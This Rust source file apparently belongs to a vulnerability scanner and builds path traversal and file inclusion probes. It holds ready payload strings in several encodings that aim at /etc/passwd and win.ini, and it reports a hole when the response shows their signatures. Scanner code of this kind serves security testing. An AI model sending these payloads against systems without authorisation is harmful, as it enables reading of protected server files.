//! Path Traversal & Local File Inclusion (LFI) Engine
//!
//! Evaluates file path parameter manipulation across traversal encodings:
//! - Sequences: ../, ..\, ....//, ....\\, %2e%2e%2f, %252e%252e%252f, ..%c0%af, %00
//! - Target signatures: /etc/passwd (root:x:0:0:), win.ini ([fonts], [extensions]), web.xml, .env

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum TraversalTargetOs {
    Unix,
    Windows,
    Generic,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TraversalProbe {
    pub target_os: TraversalTargetOs,
    pub encoding_name: &'static str,
    pub payload: String,
    pub expected_signature: &'static str,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TraversalVerificationResult {
    pub is_vulnerable: bool,
    pub target_os: TraversalTargetOs,
    pub encoding_used: String,
    pub confidence: f32,
    pub matched_file_signature: String,
    pub description: String,
}

pub struct PathTraversalEngine;

impl PathTraversalEngine {
    /// Generates multi-encoding path traversal probes
    pub fn generate_probes() -> Vec<TraversalProbe> {
        vec![
            // 1. Standard Unix /etc/passwd
            TraversalProbe {
                target_os: TraversalTargetOs::Unix,
                encoding_name: "Standard Dot-Dot-Slash",
                payload: "../../../../etc/passwd".to_string(),
                expected_signature: "root:x:0:0:",
            },
            // 2. URL-encoded (%2e%2e%2f)
            TraversalProbe {
                target_os: TraversalTargetOs::Unix,
                encoding_name: "Single URL Encoding",
                payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
                expected_signature: "root:x:0:0:",
            },
            // 3. Double URL-encoded (%252e%252e%252f)
            TraversalProbe {
                target_os: TraversalTargetOs::Unix,
                encoding_name: "Double URL Encoding",
                payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd".to_string(),
                expected_signature: "root:x:0:0:",
            },
            // 4. Overlong UTF-8 (..%c0%af)
            TraversalProbe {
                target_os: TraversalTargetOs::Unix,
                encoding_name: "Overlong UTF-8 Slash",
                payload: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd".to_string(),
                expected_signature: "root:x:0:0:",
            },
            // 5. Windows win.ini
            TraversalProbe {
                target_os: TraversalTargetOs::Windows,
                encoding_name: "Windows Backslash",
                payload: r"..\..\..\..\windows\win.ini".to_string(),
                expected_signature: "[fonts]",
            },
            // 6. Windows forward slash
            TraversalProbe {
                target_os: TraversalTargetOs::Windows,
                encoding_name: "Windows Forward Slash",
                payload: "../../../../windows/win.ini".to_string(),
                expected_signature: "[fonts]",
            },
        ]
    }

    /// Evaluates if response body contains target file signatures
    pub fn evaluate_response(
        probe: &TraversalProbe,
        response_body: &str,
    ) -> Option<TraversalVerificationResult> {
        if response_body.contains(probe.expected_signature) {
            return Some(TraversalVerificationResult {
                is_vulnerable: true,
                target_os: probe.target_os.clone(),
                encoding_used: probe.encoding_name.to_string(),
                confidence: 0.99,
                matched_file_signature: probe.expected_signature.to_string(),
                description: format!(
                    "Path Traversal / LFI Confirmed ({:?} via {}): Matched file signature '{}'.",
                    probe.target_os, probe.encoding_name, probe.expected_signature
                ),
            });
        }
        None
    }
}
